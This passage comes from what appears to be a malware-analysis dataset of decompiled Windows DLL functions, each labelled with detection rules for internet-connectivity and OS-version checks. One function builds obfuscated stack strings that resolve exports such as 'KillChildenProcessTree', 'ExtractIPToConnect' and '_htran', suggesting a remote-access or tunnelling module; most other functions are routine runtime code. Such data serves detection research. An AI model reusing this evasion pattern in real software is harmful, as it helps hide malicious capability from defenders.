0x5f;\n                        uStack259 = 0x68;\n                        uStack258 = 0x74;\n                        uStack257 = 0x72;\n                        uStack256 = 0x61;\n                        uStack255 = 0x6e;\n                        uStack254 = 0;\n                        *0x18004ac80 = fcn.18000acf0(*(arg1 + 0x28), &uStack272);\n                        if (*0x18004ac80 == 0) {\n                            uStack70 = 0;\n                            fcn.180001120(auStack664);\n                            fcn.180007ac0(auStack528);\n                            fcn.180001120(auStack480);\n                            goto code_r0x000180023290;\n                        }\n                        uStack344 = 0x4b;\n                        uStack343 = 0x69;\n                        uStack342 = 0x6c;\n                        uStack341 = 0x6c;\n                        uStack340 = 0x43;\n                        uStack339 = 0x68;\n                        uStack338 = 0x69;\n                        uStack337 = 0x6c;\n                        uStack336 = 100;\n                        uStack335 = 0x65;\n                        uStack334 = 0x6e;\n                        uStack333 = 0x50;\n                        uStack332 = 0x72;\n                        uStack331 = 0x6f;\n                        uStack330 = 99;\n                        uStack329 = 0x65;\n                        uStack328 = 0x73;\n                        uStack327 = 0x73;\n                        uStack326 = 0x54;\n                        uStack325 = 0x72;\n                        uStack324 = 0x65;\n                        uStack323 = 0x65;\n                        uStack322 = 0;\n                        *0x18004ac88 = fcn.18000acf0(*(arg1 + 0x28), &uStack344);\n                        if (*0x18004ac88 == 0) {\n                            uStack69 = 0;\n                            fcn.180001120(auStack664);\n                            fcn.180007ac0(auStack528);\n                            fcn.180001120(auStack480);\n                            goto code_r0x000180023290;\n                        }\n                        uStack224 = 0x45;\n                        uStack223 = 0x78;\n                        uStack222 = 0x74;\n                        uStack221 = 0x72;\n                        uStack220 = 0x61;\n                        uStack219 = 99;\n                        uStack218 = 0x74;\n                        uStack217 = 0x49;\n                        uStack216 = 0x50;\n                        uStack215 = 0x54;\n                        uStack214 = 0x6f;\n                        uStack213 = 0x43;\n                        uStack212 = 0x6f;\n                        uStack211 = 0x6e;\n                        uStack210 = 0x6e;\n                        uStack209 = 0x65;\n                        uStack208 = 99;\n                        uStack207 = 0x74;\n                        uStack206 = 0;\n                        *0x18004ac90 = fcn.18000acf0(*(arg1 + 0x28), &uStack224);\n                        if (*0x18004ac90 == 0) {\n                            uStack68 = 0;\n                            fcn.180001120(auStack664);\n                            fcn.180007ac0(auStack528);\n                            fcn.180001120(auStack480);\n                            goto code_r0x000180023290;\n                        }\n                        uStack176 = 0x45;\n                        uStack175 = 0x78;\n                        uStack174 = 0x74;\n                        uStack173 = 0x72;\n                        uStack172 = 0x61;\n                        uStack171 = 99;\n                        uStack170 = 0x74;\n                        uStack169 = 0x49;\n                        uStack168 = 0x50;\n                        uStack167 = 0x54;\n                        uStack166 = 0x6f;\n                        uStack165 = 0x43;\n                        uStack164 = 0x6f;\n                        uStack163 = 0x6e;\n                        uStack162 = 0x6e;\n                        uStack161 = 0x65;\n                        uStack160 = 99;\n                        uStack159 = 0x74;\n                        uStack158 = 0x31;\n                        uStack157 = 0;\n                        *0x18004ac98 = fcn.18000acf0(*(arg1 + 0x28), &uStack176);\n                        uStack320 = 0x47;\n                        uStack319 = 0x65;\n                        uStack318 = 0x74;\n                        uStack317 = 0x44;\n                        uStack316 = 0x65;\n                        uStack315 = 0x76;\n                        uStack314 = 0x69;\n                        uStack313 = 99;\n                        uStack312 = 0x65;\n                        uStack311 = 0x49;\n                        uStack310 = 0x6e;\n                        uStack309 = 0x66;\n                        uStack308 = 0x6f;\n                        uStack307 = 0x53;\n                        uStack306 = 0x74;\n                        uStack305 = 0x72;\n                        uStack304 = 0x69;\n                        uStack303 = 0x6e;\n                        uStack302 = 0x67;\n                        uStack301 = 0x31;\n                        uStack300 = 0;\n                        *0x18004aca0 = fcn.18000acf0(*(arg1 + 0x28), &uStack320);\n                        if (*0x18004aca0 == 0) {\n                            uStack67 = 0;\n                            fcn.180001120(auStack664);\n                            fcn.180007ac0(auStack528);\n                            fcn.180001120(auStack480);\n                            goto code_r0x000180023290;\n                        }\n                    }\n                    uStack608 = 0x44;\n                    uStack607 = 0x65;\n                    uStack606 = 99;\n                    uStack605 = 0x72;\n                    uStack604 = 0x79;\n                    uStack603 = 0x70;\n                    uStack602 = 0x74;\n                    uStack601 = 0x5f;\n                    uStack600 = 0x42;\n                    uStack599 = 0x79;\n                    uStack598 = 0x74;\n                    uStack597 = 0x65;\n                    uStack596 = 0x54;\n                    uStack595 = 0x6f;\n                    uStack594 = 0x42;\n                    uStack593 = 0x79;\n                    uStack592 = 0x74;\n                    uStack591 = 0x65;\n                    uStack590 = 0;\n                    *0x18004aca8 = fcn.18000acf0(*(arg1 + 0x28), &uStack608);\n                    if (*0x18004aca8 == 0) {\n                        uStack66 = 0;\n                        fcn.180001120(auStack664);\n                        fcn.180007ac0(auStack528);\n                        fcn.180001120(auStack480);\n                    }\n                    else {\n                        if (*(puStack616 + 1) != 0) {\n                            fcn.180015b80(puStack616 + 1);\n                        }\n                        if (puStack616 != NULL) {\n                            fcn.180015b80(&puStack616);\n                        }\n                        uStack65 = 1;\n                        fcn.180001120(auStack664);\n                        fcn.180007ac0(auStack528);\n                        fcn.180001120(auStack480);\n                    }\n                }\n            }\n        }\n        else {\n            uStack80 = 0;\n            fcn.180007ac0(auStack528);\n            fcn.180001120(auStack480);\n        }\n    }\ncode_r0x000180023290:\n    fcn.180023980(uStack24 ^ auStack840);\n    return;\n}\n",
        "token_count": 6862
    },
    "1800232b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1800232b0(int64_t arg1)\n\n{\n    ulong uVar1;\n    char in_DL;\n    uchar auStack136 [40];\n    ushort uStack96;\n    ushort uStack94;\n    ushort uStack92;\n    ushort uStack90;\n    ushort uStack88;\n    ushort uStack86;\n    ushort uStack84;\n    ushort uStack82;\n    ushort uStack80;\n    ushort uStack78;\n    ushort uStack76;\n    ushort uStack74;\n    ushort uStack72;\n    ushort uStack70;\n    ushort uStack68;\n    ushort uStack66;\n    ushort uStack64;\n    ushort uStack62;\n    ushort uStack60;\n    ushort uStack58;\n    uint *puStack56;\n    code *pcStack48;\n    uchar uStack40;\n    uchar uStack39;\n    uchar uStack38;\n    uchar uStack37;\n    uchar uStack36;\n    uchar uStack35;\n    uchar uStack34;\n    uchar uStack33;\n    uchar uStack32;\n    uchar uStack31;\n    uint64_t uStack24;\n    \n    uStack24 = *0x180040248 ^ auStack136;\n    if (*(arg1 + 0x28) != 0) {\n        puStack56 = fcn.180015b40(0xc);\n        *puStack56 = 0xffffffff;\n        uVar1 = fcn.180015b40(0x4000);\n        *(puStack56 + 1) = uVar1;\n        uStack96 = 0x53;\n        uStack94 = 0x65;\n        uStack92 = 0x72;\n        uStack90 = 0x76;\n        uStack88 = 0x65;\n        uStack86 = 0x72;\n        uStack84 = 0x42;\n        uStack82 = 0x61;\n        uStack80 = 0x73;\n        uStack78 = 0x65;\n        uStack76 = 0x20;\n        uStack74 = 0x2d;\n        uStack72 = 0x43;\n        uStack70 = 0x6c;\n        uStack68 = 0x65;\n        uStack66 = 0x61;\n        uStack64 = 0x6e;\n        uStack62 = 0x75;\n        uStack60 = 0x70;\n        uStack58 = 0;\n        fcn.180001590(*(puStack56 + 1), 0x4000, &uStack96);\n        if (in_DL != '\\0') {\n            uStack40 = 0x43;\n            uStack39 = 0x6f;\n            uStack38 = 0x6e;\n            uStack37 = 0x73;\n            uStack36 = 0x74;\n            uStack35 = 0x72;\n            uStack34 = 0x75;\n            uStack33 = 99;\n            uStack32 = 0x74;\n            uStack31 = 0;\n            pcStack48 = fcn.18000acf0(*(arg1 + 0x28), &uStack40);\n            if (pcStack48 != NULL) {\n                (*pcStack48)(puStack56);\n            }\n        }\n        fcn.18000af00(*(arg1 + 0x28));\n        if (*(puStack56 + 1) != 0) {\n            fcn.180015b80(puStack56 + 1);\n        }\n        if (puStack56 != NULL) {\n            fcn.180015b80(&puStack56);\n        }\n    }\n    fcn.180023980(uStack24 ^ auStack136);\n    return;\n}\n",
        "token_count": 810
    },
    "18002356": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.180023560(int64_t arg1, uint64_t arg2)\n\n{\n    char cVar1;\n    int64_t arg2_00;\n    \n    if (*0x180039ea8 - *(arg1 + 0x10) <= arg2) {\n        fcn.18000c240(arg1);\n    }\n    if (arg2 != 0) {\n        arg2_00 = *(arg1 + 0x10) + arg2;\n        cVar1 = fcn.1800029c0(arg1, arg2_00);\n        if (cVar1 != '\\0') {\n            fcn.1800236e0(arg1, *(arg1 + 0x10), arg2);\n            fcn.1800026c0(arg1, arg2_00);\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 188
    },
    "18002361": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.180023610(int64_t arg1, ulong arg2, uint64_t arg3, int64_t arg4)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uint64_t uStack16;\n    \n    if ((arg4 != 0) && (arg3 < *(arg1 + 0x10))) {\n        iVar1 = fcn.1800027b0(arg1);\n        iVar3 = *(arg1 + 0x10);\n        iVar2 = fcn.1800027b0(arg1);\n        for (uStack16 = iVar2 + arg3 * 2; uStack16 < iVar1 + iVar3 * 2; uStack16 = uStack16 + 2) {\n            iVar2 = fcn.1800014d0(arg2, arg4, uStack16);\n            if (iVar2 != 0) {\n                iVar3 = fcn.1800027b0(arg1);\n                return uStack16 - iVar3 >> 1;\n            }\n        }\n    }\n    return *0x180039ea8;\n}\n",
        "token_count": 247
    },
    "1800236e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.1800236e0(ulong arg1, int64_t arg2, int64_t arg3)\n\n{\n    int64_t iVar1;\n    uchar auStackX32 [8];\n    \n    if (arg3 == 1) {\n        iVar1 = fcn.1800027b0(arg1);\n        fcn.180001530(iVar1 + arg2 * 2, auStackX32);\n    }\n    else {\n        iVar1 = fcn.1800027b0(arg1);\n        fcn.18001e710(iVar1 + arg2 * 2, arg3);\n    }\n    return;\n}\n",
        "token_count": 139
    },
    "180023a3": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180023a34(int64_t arg1)\n\n{\n    if (*(arg1 + 0x10) != '\\0') {\n        fcn.180024024(*(arg1 + 8));\n    }\n    *(arg1 + 8) = 0;\n    *(arg1 + 0x10) = 0;\n    return;\n}\n",
        "token_count": 78
    },
    "1800254c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_bp_20h\n// WARNING: Variable defined which should be unmapped: var_bp_28h\n\nvoid fcn.1800254c0(char *arg1, uint16_t *arg2, uint64_t arg3)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint16_t *puVar6;\n    uint64_t uVar7;\n    int64_t iVar8;\n    uint64_t uVar9;\n    uint64_t uVar10;\n    uchar auStack184 [32];\n    char *pcStack152;\n    uint uStack144;\n    ulong uStack136;\n    int32_t *piStack128;\n    int32_t aiStack120 [2];\n    int64_t aiStack112 [2];\n    int64_t iStack96;\n    char cStack88;\n    char acStack80 [8];\n    uint64_t CodePage;\n    ulong var_38h;\n    ulong var_bp_28h;\n    ulong var_bp_20h;\n    ulong var_18h;\n    ulong var_10h;\n    \n    CodePage = *0x180040248 ^ auStack184;\n    uVar9 = 0;\n    aiStack120[0] = 0;\n    if ((arg1 != NULL) && (arg3 == 0)) goto code_r0x000180025497;\n    if (arg2 == NULL) {\n        puVar5 = fcn.180025ba4();\n        *puVar5 = 0x16;\n        fcn.180026334();\n        goto code_r0x000180025497;\n    }\n    fcn.1800241bc(aiStack112, 0);\n    if (arg1 == NULL) {\n        if (*(aiStack112[0] + 0x14) == 0) {\n            uVar2 = *arg2;\n            while (uVar2 != 0) {\n                if (0xff < uVar2) goto code_r0x000180025202;\n                arg2 = arg2 + 1;\n                uVar2 = *arg2;\n            }\n            if (cStack88 != '\\0') {\n                *(iStack96 + 200) = *(iStack96 + 200) & 0xfffffffd;\n            }\n            goto code_r0x000180025497;\n        }\n        piStack128 = aiStack120;\n        uStack136 = 0;\n        uStack144 = 0;\n        pcStack152 = NULL;\n        iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(*(aiStack112[0] + 4), 0, arg2, 0xffffffff);\n        if ((iVar3 == 0) || (aiStack120[0] != 0)) goto code_r0x000180025478;\ncode_r0x0001800252ae:\n        if (cStack88 != '\\0') {\n            *(iStack96 + 200) = *(iStack96 + 200) & 0xfffffffd;\n        }\n    }\n    else {\n        if (*(aiStack112[0] + 0x14) == 0) {\n            if (arg3 != 0) {\n                do {\n                    if (0xff < *arg2) goto code_r0x000180025202;\n                    arg1[uVar9] = *arg2;\n                    uVar2 = *arg2;\n                    arg2 = arg2 + 1;\n                    if (uVar2 == 0) {\n                        if (cStack88 != '\\0') {\n                            *(iStack96 + 200) = *(iStack96 + 200) & 0xfffffffd;\n                        }\n                        goto code_r0x000180025497;\n                    }\n                    uVar9 = uVar9 + 1;\n                } while (uVar9 < arg3);\n            }\n        }\n        else {\n            pcStack152 = arg1;\n            if (*(aiStack112[0] + 0x10c) == 1) {\n                puVar6 = arg2;\n                uVar9 = arg3;\n                if (arg3 != 0) {\n                    do {\n                        if (*puVar6 == 0) break;\n                        puVar6 = puVar6 + 1;\n                        uVar9 = uVar9 - 1;\n                    } while (uVar9 != 0);\n                    if ((uVar9 != 0) && (*puVar6 == 0)) {\n                        arg3 = (puVar6 - arg2 >> 1) + 1;\n                    }\n                }\n                piStack128 = aiStack120;\n                uStack144 = arg3;\n                uStack136 = 0;\n                iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(*(aiStack112[0] + 4), 0, arg2, arg3 & 0xffffffff);\n                if ((iVar3 == 0) || (aiStack120[0] != 0)) {\ncode_r0x000180025202:\n                    puVar5 = fcn.180025ba4();\n                    *puVar5 = 0x2a;\n                    if (cStack88 != '\\0') {\n                        *(iStack96 + 200) = *(iStack96 + 200) & 0xfffffffd;\n                    }\n                    goto code_r0x000180025497;\n                }\n                goto code_r0x0001800252ae;\n            }\n            piStack128 = aiStack120;\n            uStack136 = 0;\n            uStack144 = arg3;\n            iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(*(aiStack112[0] + 4), 0, arg2, 0xffffffff);\n            uVar10 = iVar3;\n            if (iVar3 == 0) {\n                if ((aiStack120[0] == 0) && (iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar3 == 0x7a)) {\n                    if (arg3 != 0) {\n                        do {\n                            piStack128 = aiStack120;\n                            uStack144 = *(aiStack112[0] + 0x10c);\n                            uStack136 = 0;\n                            pcStack152 = acStack80;\n                            uVar4 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(*(aiStack112[0] + 4), 0, arg2, 1);\n                            if ((((uVar4 == 0) || (aiStack120[0] != 0)) || (uVar4 < 0)) || (5 < uVar4))\n                            goto code_r0x000180025478;\n                            iVar8 = uVar4;\n                            if (arg3 < iVar8 + uVar10) break;\n                            uVar7 = uVar9;\n                            if (0 < iVar8) {\n                                do {\n                                    cVar1 = acStack80[uVar7];\n                                    arg1[uVar10] = cVar1;\n                                    if (cVar1 == '\\0') {\n                                        if (cStack88 != '\\0') {\n                                            *(iStack96 + 200) = *(iStack96 + 200) & 0xfffffffd;\n                                        }\n                                        goto code_r0x000180025497;\n                                    }\n                                    uVar7 = uVar7 + 1;\n                                    uVar10 = uVar10 + 1;\n                                } while (uVar7 < iVar8);\n                            }\n                            arg2 = arg2 + 1;\n                        } while (uVar10 < arg3);\n                    }\n                    if (cStack88 != '\\0') {\n                        *(iStack96 + 200) = *(iStack96 + 200) & 0xfffffffd;\n                    }\n                    goto code_r0x000180025497;\n                }\n            }\n            else if (aiStack120[0] == 0) goto code_r0x0001800252ae;\ncode_r0x000180025478:\n            puVar5 = fcn.180025ba4();\n            *puVar5 = 0x2a;\n        }\n        if (cStack88 != '\\0') {\n            *(iStack96 + 200) = *(iStack96 + 200) & 0xfffffffd;\n        }\n    }\ncode_r0x000180025497:\n    fcn.180023980(CodePage ^ auStack184);\n    return;\n}\n",
        "token_count": 1869
    },
    "180025b5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180025b54(uint8_t *arg1, uint8_t **arg2)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint32_t *puVar3;\n    int64_t iVar4;\n    uint8_t *arg2_00;\n    uchar auStack120 [32];\n    int64_t aiStack88 [2];\n    int64_t iStack72;\n    char cStack64;\n    uchar auStack56 [24];\n    uint64_t uStack32;\n    \n    uStack32 = *0x180040248 ^ auStack120;\n    fcn.1800241bc(aiStack88, 0);\n    if (arg2 != NULL) {\n        *arg2 = arg1;\n    }\n    iVar4 = aiStack88[0];\n    arg2_00 = arg1;\n    if (arg1 == NULL) {\n        puVar2 = fcn.180025ba4();\n        *puVar2 = 0x16;\n        fcn.180026334();\n        if (cStack64 != '\\0') {\n            *(iStack72 + 200) = *(iStack72 + 200) & 0xfffffffd;\n        }\n    }\n    else {\n        while( true ) {\n            if (*(iVar4 + 0x10c) < 2) {\n                uVar1 = *(*(iVar4 + 0x140) + *arg2_00 * 2) & 8;\n            }\n            else {\n                uVar1 = fcn.180028da0(*arg2_00, 8, aiStack88);\n                iVar4 = aiStack88[0];\n            }\n            if (uVar1 == 0) break;\n            arg2_00 = arg2_00 + 1;\n        }\n        puVar3 = fcn.18002a324(auStack56, arg2_00, aiStack88);\n        if (arg2 != NULL) {\n            *arg2 = arg2_00 + puVar3[1];\n        }\n        if ((*puVar3 & 0x240) == 0) {\n            if (((*puVar3 & 0x81) != 0) || (((*puVar3 & 0x100) != 0 && (*(puVar3 + 4) == 0.0)))) {\n                puVar2 = fcn.180025ba4();\n                *puVar2 = 0x22;\n            }\n        }\n        else if (arg2 != NULL) {\n            *arg2 = arg1;\n        }\n        if (cStack64 != '\\0') {\n            *(iStack72 + 200) = *(iStack72 + 200) & 0xfffffffd;\n        }\n    }\n    fcn.180023980(uStack32 ^ auStack120);\n    return;\n}\n",
        "token_count": 612
    },
    "18002940": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.18002940c(uchar *arg1, ulong arg2, int64_t arg3, int32_t *arg4)\n\n{\n    int32_t iVar1;\n    unkbyte7 Var2;\n    int32_t *in_stack_00000028;\n    \n    Var2 = arg1 >> 8;\n    iVar1 = *in_stack_00000028;\n    if (((*(arg3 + 0x18) & 0x40) == 0) || (*(arg3 + 0x10) != 0)) {\n        *in_stack_00000028 = 0;\n        if (0 < arg2) {\n            do {\n                arg2._0_4_ = arg2 + -1;\n                fcn.1800274d0(CONCAT71(Var2, *arg1), arg3, arg4);\n                arg1 = arg1 + 1;\n                if (*arg4 == -1) {\n                    if (*in_stack_00000028 != 0x2a) break;\n                    fcn.1800274d0(CONCAT71(Var2, 0x3f), arg3, arg4);\n                }\n            } while (0 < arg2);\n            if (*in_stack_00000028 != 0) {\n                return;\n            }\n        }\n        *in_stack_00000028 = iVar1;\n    }\n    else {\n        *arg4 = *arg4 + arg2;\n    }\n    return;\n}\n",
        "token_count": 317
    },
    "18002a31": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00018002a2b7)\n// WARNING: Removing unreachable block (ram,0x00018002a2bc)\n// WARNING: Removing unreachable block (ram,0x00018002a2c2)\n// WARNING: Removing unreachable block (ram,0x00018002a2ca)\n// WARNING: Removing unreachable block (ram,0x00018002a2ce)\n\nint32_t fcn.18002a318(void)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    \n    iVar4 = 0;\n    fcn.18002d3ac(1);\n    for (uVar3 = 0; uVar3 < *0x18004c1a0; uVar3 = uVar3 + 1) {\n        iVar5 = uVar3;\n        if ((*(*0x18004b180 + iVar5 * 8) != 0) && (iVar1 = *(*0x18004b180 + iVar5 * 8),  (*(iVar1 + 0x18) & 0x83) != 0))\n        {\n            fcn.180028ffc(uVar3, iVar1);\n            iVar1 = *(*0x18004b180 + iVar5 * 8);\n            if (((*(iVar1 + 0x18) & 0x83) != 0) && (iVar2 = fcn.18002a1e0(iVar1),  iVar2 != -1)) {\n                iVar4 = iVar4 + 1;\n            }\n            fcn.18002907c(uVar3, *(*0x18004b180 + iVar5 * 8));\n        }\n    }\n    fcn.18002d2ac(1);\n    return iVar4;\n}\n",
        "token_count": 408
    },
    "18002b2c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.18002b2c0(uint16_t *arg1, ulong arg2, int64_t arg3, int32_t *arg4)\n\n{\n    int32_t iVar1;\n    int32_t *in_stack_00000028;\n    \n    iVar1 = *in_stack_00000028;\n    if (((*(arg3 + 0x18) & 0x40) == 0) || (*(arg3 + 0x10) != 0)) {\n        *in_stack_00000028 = 0;\n        if (0 < arg2) {\n            do {\n                arg2._0_4_ = arg2 + -1;\n                fcn.18002b234(*arg1, arg3, arg4);\n                arg1 = arg1 + 1;\n                if (*arg4 == -1) {\n                    if (*in_stack_00000028 != 0x2a) break;\n                    fcn.18002b234(0x3f, arg3, arg4);\n                }\n            } while (0 < arg2);\n            if (*in_stack_00000028 != 0) {\n                return;\n            }\n        }\n        *in_stack_00000028 = iVar1;\n    }\n    else {\n        *arg4 = *arg4 + arg2;\n    }\n    return;\n}\n",
        "token_count": 287
    },
    "18002f18": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.18002f184(uint16_t *arg1, uint8_t *arg2, uint64_t arg3, ulong arg4)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int64_t var_20h;\n    int64_t var_10h;\n    ulong var_8h;\n    \n    if ((arg2 != NULL) && (arg3 != 0)) {\n        if (*arg2 != 0) {\n            fcn.1800241bc(&var_20h, arg4);\n            if (*(var_20h + 0x14) != 0) {\n                iVar2 = fcn.18002b168(*arg2, &var_20h);\n                if (iVar2 == 0) {\n                    iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(*(var_20h + 4), 9, arg2, 1, arg1, arg1 != NULL)\n                    ;\n                    if (iVar2 != 0) goto code_r0x00018002f200;\n                }\n                else {\n                    iVar2 = *(var_20h + 0x10c);\n                    if ((((1 < iVar2) && (iVar2 <= arg3)) &&\n                        (iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                           (*(var_20h + 4), 9, arg2, iVar2, arg1, arg1 != NULL),  iVar2 != 0)) ||\n                       ((*(var_20h + 0x10c) <= arg3 && (arg2[1] != 0)))) {\n                        uVar1 = *(var_20h + 0x10c);\n                        if (var_8h == '\\0') {\n                            return uVar1;\n                        }\n                        *(var_10h + 200) = *(var_10h + 200) & 0xfffffffd;\n                        return uVar1;\n                    }\n                }\n                puVar3 = fcn.180025ba4();\n                *puVar3 = 0x2a;\n                if (var_8h != '\\0') {\n                    *(var_10h + 200) = *(var_10h + 200) & 0xfffffffd;\n                }\n                return 0xffffffff;\n            }\n            if (arg1 != NULL) {\n                *arg1 = *arg2;\n            }\ncode_r0x00018002f200:\n            if (var_8h != '\\0') {\n                *(var_10h + 200) = *(var_10h + 200) & 0xfffffffd;\n            }\n            return 1;\n        }\n        if (arg1 != NULL) {\n            *arg1 = 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 622
    },
    "18003016": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180030164(char *arg1, ulong arg2, ulong *arg3)\n\n{\n    ulong uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    bool bVar4;\n    int16_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    \n    *arg3 = 0;\n    *(arg3 + 4) = 0;\n    *(arg3 + 1) = 0;\n    iVar5 = 0x404e;\n    if (arg2 != 0) {\n        uVar9 = 0;\n        uVar7 = 0;\n        uVar10 = 0;\n        bVar4 = true;\n        do {\n            uVar1 = *arg3;\n            uVar8 = *(arg3 + 1);\n            uVar2 = uVar9 * 4;\n            uVar6 = (uVar7 * 2 | uVar9 >> 0x1f) * 2 | uVar9 * 2 >> 0x1f;\n            uVar10 = (uVar10 * 2 | uVar7 >> 0x1f) * 2 | uVar7 * 2 >> 0x1f;\n            uVar7 = uVar1;\n            *arg3 = uVar2;\n            uVar9 = uVar2 + uVar7;\n            *(arg3 + 4) = uVar6;\n            *(arg3 + 1) = uVar10;\n            if ((uVar9 < uVar2) || (bVar3 = false,  uVar9 < uVar7)) {\n                bVar3 = bVar4;\n            }\n            *arg3 = uVar9;\n            uVar7 = uVar6;\n            if (bVar3) {\n                uVar7 = uVar6 + 1;\n                if ((uVar7 < uVar6) || (bVar3 = false,  uVar7 == 0)) {\n                    bVar3 = bVar4;\n                }\n                *(arg3 + 4) = uVar7;\n                if (bVar3) {\n                    uVar10 = uVar10 + 1;\n                    *(arg3 + 1) = uVar10;\n                }\n            }\n            uVar2 = uVar1 >> 0x20;\n            uVar6 = uVar7 + uVar2;\n            if ((uVar6 < uVar7) || (bVar3 = false,  uVar6 < uVar2)) {\n                bVar3 = bVar4;\n            }\n            *(arg3 + 4) = uVar6;\n            if (bVar3) {\n                uVar10 = uVar10 + 1;\n                *(arg3 + 1) = uVar10;\n            }\n            uVar7 = uVar9 * 2;\n            uVar10 = (uVar10 + uVar8) * 2 | uVar6 >> 0x1f;\n            *arg3 = uVar7;\n            *(arg3 + 1) = uVar10;\n            uVar8 = uVar6 * 2 | uVar9 >> 0x1f;\n            *(arg3 + 4) = uVar8;\n            uVar9 = uVar7 + *arg1;\n            if ((uVar9 < uVar7) || (bVar3 = false,  uVar9 < *arg1)) {\n                bVar3 = bVar4;\n            }\n            *arg3 = uVar9;\n            uVar7 = uVar8;\n            if (bVar3) {\n                uVar7 = uVar8 + 1;\n                if ((uVar7 < uVar8) || (bVar3 = false,  uVar7 == 0)) {\n                    bVar3 = bVar4;\n                }\n                *(arg3 + 4) = uVar7;\n                if (bVar3) {\n                    uVar10 = uVar10 + 1;\n                    *(arg3 + 1) = uVar10;\n                }\n            }\n            arg1 = arg1 + 1;\n            arg2._0_4_ = arg2 + -1;\n            *(arg3 + 4) = uVar7;\n            *(arg3 + 1) = uVar10;\n        } while (arg2 != 0);\n    }\n    if (*(arg3 + 1) == 0) {\n        uVar9 = *(arg3 + 4);\n        do {\n            uVar7 = *arg3;\n            *(arg3 + 1) = uVar9 >> 0x10;\n            *arg3 = uVar7 << 0x10;\n            uVar10 = uVar7 >> 0x10 | uVar9 << 0x10;\n            iVar5 = iVar5 + -0x10;\n            *(arg3 + 4) = uVar10;\n            uVar7 = uVar9 >> 